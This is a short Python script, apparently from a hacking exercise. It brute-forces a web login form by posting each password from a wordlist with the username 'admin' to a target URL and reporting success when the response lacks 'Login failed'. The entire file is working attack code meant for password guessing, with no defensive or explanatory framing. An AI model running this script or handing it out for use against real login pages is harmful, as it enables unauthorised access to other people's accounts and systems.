#!/usr/bin/env python

import requests

target_url = "any login address" # Check the post address in source info on inspect
data_dict = {"username": "admin", "password": "", "Login": "submit"}
# it's obviously possible to do the same common credentials used system with the username

with open ("/root/PycharmProjects/guess_login/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in str(response.content):
            print("[+] Got the password!! --> " + word)
            exit()

print("[+] Reached end of line.")